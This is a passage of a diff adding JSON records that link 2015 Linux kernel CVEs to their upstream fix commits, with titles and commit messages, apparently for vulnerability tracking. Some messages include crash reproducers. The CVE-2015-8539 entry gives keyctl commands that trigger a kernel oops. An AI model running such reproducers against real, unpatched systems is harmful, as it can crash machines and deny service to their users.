loss from bar and being able to read old and # stale data from foo that should not be possible to read anymore through normal # filesystem operations. Contrast with the case where we truncate a file from a # size N to a smaller size M, truncate it back to size N and then read the range # [M, N[, we should always get the value 0x00 for all the bytes in that range. # We expected the clone operation to fail with errno EOPNOTSUPP and therefore # not modify our file's bar data/metadata. So its content should be 256 bytes # long with all bytes having the value 0xbb. # # Without the btrfs bug fix, the clone operation succeeded and resulted in # leaking truncated data from foo, the bytes that belonged to its range # [128, 256[, and losing data from bar in that same range. So reading the # file gave us the following content: # # 0000000 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 # * # 0000200 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a # * # 0000400 echo \"File bar's content after the clone operation:\" od -t x1 $SCRATCH_MNT/bar # Also because the foo's inline extent was not shrunk by the truncate # operation, btrfs' fsck, which is run by the fstests framework everytime a # test completes, failed reporting the following error: # # root 5 inode 257 errors 400, nbytes wrong status=0 exit Cc: stable@vger.kernel.org Signed-off-by: Filipe Manana <fdmanana@suse.com>"
+      }
+    ],
+    "CVE-2015-8539": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=096fe9eaea40a17e125569f9e657e34cdb6d73bd",
+        "title": "KEYS: Fix handling of stored error in a negatively instantiated user key",
+        "description": "If a user key gets negatively instantiated, an error code is cached in the payload area. A negatively instantiated key may be then be positively instantiated by updating it with valid data. However, the ->update key type method must be aware that the error code may be there. The following may be used to trigger the bug in the user key type: keyctl request2 user user \"\" @u keyctl add user user \"a\" @u which manifests itself as: BUG: unable to handle kernel paging request at 00000000ffffff8a IP: [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f/0x280 kernel/rcu/tree.c:3046 PGD 7cc30067 PUD 0 Oops: 0002 [#1] SMP Modules linked in: CPU: 3 PID: 2644 Comm: a.out Not tainted 4.3.0+ #49 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011 task: ffff88003ddea700 ti: ffff88003dd88000 task.ti: ffff88003dd88000 RIP: 0010:[<ffffffff810a376f>] [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f/0x280 [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f/0x280 kernel/rcu/tree.c:3046 RSP: 0018:ffff88003dd8bdb0 EFLAGS: 00010246 RAX: 00000000ffffff82 RBX: 0000000000000000 RCX: 0000000000000001 RDX: ffffffff81e3fe40 RSI: 0000000000000000 RDI: 00000000ffffff82 RBP: ffff88003dd8bde0 R08: ffff88007d2d2da0 R09: 0000000000000000 R10: 0000000000000000 R11: ffff88003e8073c0 R12: 00000000ffffff82 R13: ffff88003dd8be68 R14: ffff88007d027600 R15: ffff88003ddea700 FS: 0000000000b92880(0063) GS:ffff88007fd00000(0000) knlGS:0000000000000000 CS: 0010 DS: 0000 ES: 0000 CR0: 000000008005003b CR2: 00000000ffffff8a CR3: 000000007cc5f000 CR4: 00000000000006e0 Stack: ffff88003dd8bdf0 ffffffff81160a8a 0000000000000000 00000000ffffff82 ffff88003dd8be68 ffff88007d027600 ffff88003dd8bdf0 ffffffff810a39e5 ffff88003dd8be20 ffffffff812a31ab ffff88007d027600 ffff88007d027620 Call Trace: [<ffffffff810a39e5>] kfree_call_rcu+0x15/0x20 kernel/rcu/tree.c:3136 [<ffffffff812a31ab>] user_update+0x8b/0xb0 security/keys/user_defined.c:129 [< inline >] __key_update security/keys/key.c:730 [<ffffffff8129e5c1>] key_create_or_update+0x291/0x440 security/keys/key.c:908 [< inline >] SYSC_add_key security/keys/keyctl.c:125 [<ffffffff8129fc21>] SyS_add_key+0x101/0x1e0 security/keys/keyctl.c:60 [<ffffffff8185f617>] entry_SYSCALL_64_fastpath+0x12/0x6a arch/x86/entry/entry_64.S:185 Note the error code (-ENOKEY) in EDX. A similar bug can be tripped by: keyctl request2 trusted user \"\" @u keyctl add trusted user \"a\" @u This should also affect encrypted keys - but that has to be correctly parameterised or it will fail with EINVAL before getting to the bit that will crashes. Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Acked-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Signed-off-by: James Morris <james.l.morris@oracle.com>"
+      }
+    ],
+    "CVE-2015-8569": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=09ccfd238e5a0e670d8178cf50180ea81ae09ae1",
+        "title": "pptp: verify sockaddr_len in pptp_bind() and pptp_connect()",
+        "description": "Reported-by: Dmitry Vyukov <dvyukov@gmail.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
+      }
+    ],
+    "CVE-2015-8575": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=5233252fce714053f0151680933571a2da9cbfb4",
+        "title": "bluetooth: Validate socket address length in sco_sock_bind().",
+        "description": "Signed-off-by: David S. Miller <davem@davemloft.net>"
+      }
+    ],
+    "CVE-2015-8660": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=acff81ec2c79492b180fade3c2894425cd35a545",
+        "title": "ovl: fix permission checking for setattr",
+        "description": "[Al Viro] The bug is in being too enthusiastic about optimizing ->setattr() away - instead of \"copy verbatim with metadata\" + \"chmod/chown/utimes\" (with the former being always safe and the latter failing in case of insufficient permissions) it tries to combine these two. Note that copyup itself will have to do ->setattr() anyway; _that_ is where the elevated capabilities are right. Having these two ->setattr() (one to set verbatim copy of metadata, another to do what overlayfs ->setattr() had been asked to do in the first place) combined is where it breaks. Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Cc: <stable@vger.kernel.org> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
+      }
+    ],
+    "CVE-2015-8785": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=3ca8138f014a913f98e6ef40e939868e1e9ea876",
+        "title": "fuse: break infinite loop in fuse_fill_write_pages()",
+        "description": "I got a report about unkillable task eating CPU. Further investigation shows, that the problem is in the fuse_fill_write_pages() function. If iov's first segment has zero length, we get an infinite loop, because we never reach iov_iter_advance() call. Fix this by calling iov_iter_advance() before repeating an attempt to copy data from userspace. A similar problem is described in 124d3b7041f (\"fix writev regression: pan hanging unkillable and un-straceable\"). If zero-length segmend is followed by segment with invalid address, iov_iter_fault_in_readable() checks only first segment (zero-length), iov_iter_copy_from_user_atomic() skips it, fails at second and returns zero -> goto again without skipping zero-length segment. Patch calls iov_iter_advance() before goto again: we'll skip zero-length segment at second iteraction and iov_iter_fault_in_readable() will detect invalid address. Special thanks to Konstantin Khlebnikov, who helped a lot with the commit description. Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Maxim Patlasov <mpatlasov@parallels.com> Cc: Konstantin Khlebnikov <khlebnikov@yandex-team.ru> Signed-off-by: Roman Gushchin <klamm@yandex-team.ru> Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Fixes: ea9b9907b82a (\"fuse: implement perform_write\") Cc: <stable@vger.kernel.org>"
+      }
+    ],
+    "CVE-2015-8844": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=d2b9d2a5ad5ef04ff978c9923d19730cb05efd55",
+        "title": "powerpc/tm: Block signal return setting invalid MSR state",
+        "description": "Currently we allow both the MSR T and S bits to be set by userspace on a signal return. Unfortunately this is a reserved configuration and will cause a TM Bad Thing exception if attempted (via rfid). This patch checks for this case in both the 32 and 64 bit signals code. If both T and S are set, we mark the context as invalid. Found using a syscall fuzzer. Fixes: 2b0a576d15e0 (\"powerpc: Add new transactional memory state to the signal context\") Cc: stable@vger.kernel.org # v3.9+ Signed-off-by: Michael Neuling <mikey@neuling.org> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>"
+      }
+    ],
+    "CVE-2015-8950": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6829e274a623187c24f7cfc0e3d35f25d087fcc5",
+        "title": "arm64: dma-mapping: always clear allocated buffers",
+        "description": "Buffers allocated by dma_alloc_coherent() are always zeroed on Alpha, ARM (32bit), MIPS, PowerPC, x86/x86_64 and probably other architectures. It turned out that some drivers rely on this 'feature'. Allocated buffer might be also exposed to userspace with dma_mmap() call, so clearing it is desired from security point of view to avoid exposing random memory to userspace. This patch unifies dma_alloc_coherent() behavior on ARM64 architecture with other implementations by unconditionally zeroing allocated buffer. Cc: <stable@vger.kernel.org> # v3.14+ Signed-off-by: Marek Szyprowski <m.szyprowski@samsung.com> Signed-off-by: Will Deacon <will.deacon@arm.com>"
+      }
+    ],
+    "CVE-2015-8953": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ab79efab0a0ba01a74df782eb7fa44b044dae8b5",
+        "title": "ovl: fix dentry reference leak",
+        "description": "In ovl_copy_up_locked(), newdentry is leaked if the function exits through out_cleanup as this just to out after calling ovl_cleanup() - which doesn't actually release the ref on newdentry. The out_cleanup segment should instead exit through out2 as certainly newdentry leaks - and possibly upper does also, though this isn't caught given the catch of newdentry. Without this fix, something like the following is seen: BUG: Dentry ffff880023e9eb20{i=f861,n=#ffff880023e82d90} still in use (1) [unmount of tmpfs tmpfs] BUG: Dentry ffff880023ece640{i=0,n=bigfile} still in use (1) [unmount of tmpfs tmpfs] when unmounting the upper layer after an error occurred in copyup. An error can be induced by creating a big file in a lower layer with something like: dd if=/dev/zero of=/lower/a/bigfile bs=65536 count=1 seek=$((0xf000)) to create a large file (4.1G). Overlay an upper layer that is too small (on tmpfs might do) and then induce a copy up by opening it writably. Reported-by: Ulrich Obergfell <uobergfe@redhat.com> Signed-off-by: David Howells <dhowells@redhat.com> Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Cc: <stable@vger.kernel.org> # v3.18+"
+      }
+    ],
+    "CVE-2015-8955": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8fff105e13041e49b82f92eef034f363a6b1c071",
+        "title": "arm64: perf: reject groups spanning multiple HW PMUs",
+        "description": "The perf core implicitly rejects events spanning multiple HW PMUs, as in these cases the event->ctx will differ. However this validation is performed after pmu::event_init() is called in perf_init_event(), and thus pmu::event_init() may be called with a group leader from a different HW PMU. The ARM64 PMU driver does not take this fact into account, and when validating groups assumes that it can call to_arm_pmu(event->pmu) for any HW event. When the event in question is from another HW PMU this is wrong, and results in dereferencing garbage. This patch updates the ARM64 PMU driver to first test for and reject events from other PMUs, moving the to_arm_pmu and related logic after this test. Fixes a crash triggered by perf_fuzzer on Linux-4.0-rc2, with a CCI PMU present: Bad mode in Synchronous Abort handler detected, code 0x86000006 -- IABT (current EL) CPU: 0 PID: 1371 Comm: perf_fuzzer Not tainted 3.19.0+ #249 Hardware name: V2F-1XV7 Cortex-A53x2 SMM (DT) task: ffffffc07c73a280 ti: ffffffc07b0a0000 task.ti: ffffffc07b0a0000 PC is at 0x0 LR is at validate_event+0x90/0xa8 pc : [<0000000000000000>] lr : [<ffffffc000090228>] pstate: 00000145 sp : ffffffc07b0a3ba0 [< (null)>] (null) [<ffffffc0000907d8>] armpmu_event_init+0x174/0x3cc [<ffffffc00015d870>] perf_try_init_event+0x34/0x70 [<ffffffc000164094>] perf_init_event+0xe0/0x10c [<ffffffc000164348>] perf_event_alloc+0x288/0x358 [<ffffffc000164c5c>] SyS_perf_event_open+0x464/0x98c Code: bad PC value Also cleans up the code to use the arm_pmu only when we know that we are dealing with an arm pmu event. Cc: Will Deacon <will.deacon@arm.com> Acked-by: Mark Rutland <mark.rutland@arm.com> Acked-by: Peter Ziljstra (Intel) <peterz@infradead.org> Signed-off-by: Suzuki K. Poulose <suzuki.poulose@arm.com> Signed-off-by: Will Deacon <will.deacon@arm.com>"
+      }
+    ],
+    "CVE-2015-8956": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=951b6a0717db97ce420547222647bcc40bf1eacd",
+        "title": "Bluetooth: Fix potential NULL dereference in RFCOMM bind callback",
+        "description": "addr can be NULL and it should not be dereferenced before NULL checking. Signed-off-by: Jaganath Kanakkassery <jaganath.k@samsung.com> Signed-off-by: Marcel Holtmann <marcel@holtmann.org>"
+      }
+    ],
+    "CVE-2015-8961": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6934da9238da947628be83635e365df41064b09b",
+        "title": "ext4: fix potential use after free in __ext4_journal_stop",
+        "description": "There is a use-after-free possibility in __ext4_journal_stop() in the case that we free the handle in the first jbd2_journal_stop() because we're referencing handle->h_err afterwards. This was introduced in 9705acd63b125dee8b15c705216d7186daea4625 and it is wrong. Fix it by storing the handle->h_err value beforehand and avoid referencing potentially freed handle. Fixes: 9705acd63b125dee8b15c705216d7186daea4625 Signed-off-by: Lukas Czerner <lczerner@redhat.com> Reviewed-by: Andreas Dilger <adilger@dilger.ca> Cc: stable@vger.kernel.org"
+      }
+    ],
+    "CVE-2015-8963": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=12ca6ad2e3a896256f086497a7c7406a547ee373",
+        "title": "perf: Fix race in swevent hash",
+        "description": "There's a race on CPU unplug where we free the swevent hash array while it can still have events on. This will result in a use-after-free which is BAD. Simply do not free the hash array on unplug. This leaves the thing around and no use-after-free takes place. When the last swevent dies, we do a for_each_possible_cpu() iteration anyway to clean these up, at which time we'll free it, so no leakage will occur. Reported-by: Sasha Levin <sasha.levin@oracle.com> Tested-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Arnaldo Carvalho de Melo <acme@redhat.com> Cc: Frederic Weisbecker <fweisbec@gmail.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Stephane Eranian <eranian@google.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: Vince Weaver <vincent.weaver@maine.edu> Signed-off-by: Ingo Molnar <mingo@kernel.org>"
+      }
+    ],
+    "CVE-2015-8964": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=dd42bf1197144ede075a9d4793123f7689e164bc",
+        "title": "tty: Prevent ldisc drivers from re-using stale tty fields",
+        "description": "Line discipline drivers may mistakenly misuse ldisc-related fields when initializing. For example, a failure to initialize tty->receive_room in the N_GIGASET_M101 line discipline was recently found and fixed [1]. Now, the N_X25 line discipline has been discovered accessing the previous line discipline's already-freed private data [2]. Harden the ldisc interface against misuse by initializing revelant tty fields before instancing the new line discipline. [1] commit fd98e9419d8d622a4de91f76b306af6aa627aa9c Author: Tilman Schmidt <tilman@imap.cc> Date: Tue Jul 14 00:37:13 2015 +0200 isdn/gigaset: reset tty->receive_room when attaching ser_gigaset [2] Report from Sasha Levin <sasha.levin@oracle.com> [ 634.336761] ================================================================== [ 634.338226] BUG: KASAN: use-after-free in x25_asy_open_tty+0x13d/0x490 at addr ffff8800a743efd0 [ 634.339558] Read of size 4 by task syzkaller_execu/8981 [ 634.340359] ============================================================================= [ 634.341598] BUG kmalloc-512 (Not tainted): kasan: bad access detected ... [ 634.405018] Call Trace: [ 634.405277] dump_stack (lib/dump_stack.c:52) [ 634.405775] print_trailer (mm/slub.c:655) [ 634.406361] object_err (mm/slub.c:662) [ 634.406824] kasan_report_error (mm/kasan/report.c:138 mm/kasan/report.c:236) [ 634.409581] __asan_report_load4_noabort (mm/kasan/report.c:279) [ 634.411355] x25_asy_open_tty (drivers/net/wan/x25_asy.c:559 (discriminator 1)) [ 634.413997] tty_ldisc_open.isra.2 (drivers/tty/tty_ldisc.c:447) [ 634.414549] tty_set_ldisc (drivers/tty/tty_ldisc.c:567) [ 634.415057] tty_ioctl (drivers/tty/tty_io.c:2646 drivers/tty/tty_io.c:2879) [ 634.423524] do_vfs_ioctl (fs/ioctl.c:43 fs/ioctl.c:607) [ 634.427491] SyS_ioctl (fs/ioctl.c:622 fs/ioctl.c:613) [ 634.427945] entry_SYSCALL_64_fastpath (arch/x86/entry/entry_64.S:188) Cc: Tilman Schmidt <tilman@imap.cc> Cc: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
+      }
+    ],
+    "CVE-2015-8966": [
+      {
+        "url": "https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=76cc404bfdc0d419c720de4daaf2584542734f42",
+        "title": "[PATCH] arm: fix handling of F_OFD_... in oabi_fcntl64()",
+        "description": "Cc: stable@vger.kernel.org # 3.15+ Reviewed-by: Jeff Layton <jeff.layton@primarydata.com> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
+      }
+    ],
+    "CVE-2015-8967": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=c623b33b4e9599c6ac5076f7db7369eb9869aa04",
+        "title": "arm64: make sys_call_table const",
+        "description": "As with x86, mark the sys_call_table const such that it will be placed in the .rodata section. This will cause attempts to modify the table (accidental or deliberate) to fail when strict page permissions are in place. In the absence of strict page permissions, there should be no functional change. Signed-off-by: Mark Rutland <mark.rutland@arm.com> Acked-by: Will Deacon <will.deacon@arm.com> Signed-off-by: Catalin Marinas <catalin.marinas@arm.com>"
+      }
+    ],
+    "CVE-2015-8970": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=dd504589577d8e8e70f51f997ad487a4cb6c026f",
+        "title": "crypto: algif_skcipher - Require setkey before accept(2)",
+        "description": "Some cipher implementations will crash if you try to use them without calling setkey first. This patch adds a check so that the accept(2) call will fail with -ENOKEY if setkey hasn't been done on the socket yet. Cc: stable@vger.kernel.org Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Tested-by: Dmitry Vyukov <dvyukov@google.com>"
+      }
+    ],
+    "CVE-2015-9004": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=c3c87e770458aa004bd7ed3f29945ff436fd6511",
+        "title": "perf: Tighten (and fix) the grouping condition",
+        "description": "The fix from 9fc81d87420d (\"perf: Fix events installation during moving group\") was incomplete in that it failed to recognise that creating a group with events for different CPUs is semantically broken -- they cannot be co-scheduled. Furthermore, it leads to real breakage where, when we create an event for CPU Y and then migrate it to form a group on CPU X, the code gets confused where the counter is programmed -- triggered in practice as well by me via the perf fuzzer. Fix this by tightening the rules for creating groups. Only allow grouping of counters that can be co-scheduled in the same context. This means for the same task and/or the same cpu. Fixes: 9fc81d87420d (\"perf: Fix events installation during moving group\") Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Arnaldo Carvalho de Melo <acme@kernel.org> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Link: http://lkml.kernel.org/r/20150123125834.090683288@infradead.org Signed-off-by: Ingo Molnar <mingo@kernel.org>"
+      }
+    ],
+    "CVE-2015-9289": [
+      {
+        "url": "https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=1fa2337a315a2448c5434f41e00d56b01a22283c",
+        "title": "[media] cx24116: fix a buffer overflow when checking userspace params",
+        "description": "The maximum size for a DiSEqC command is 6, according to the userspace API. However, the code allows to write up much more values: drivers/media/dvb-frontends/cx24116.c:983 cx24116_send_diseqc_msg() error: buffer overflow 'd->msg' 6 <= 23 Cc: stable@vger.kernel.org Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>"
+      }
+    ]
+  }
 }
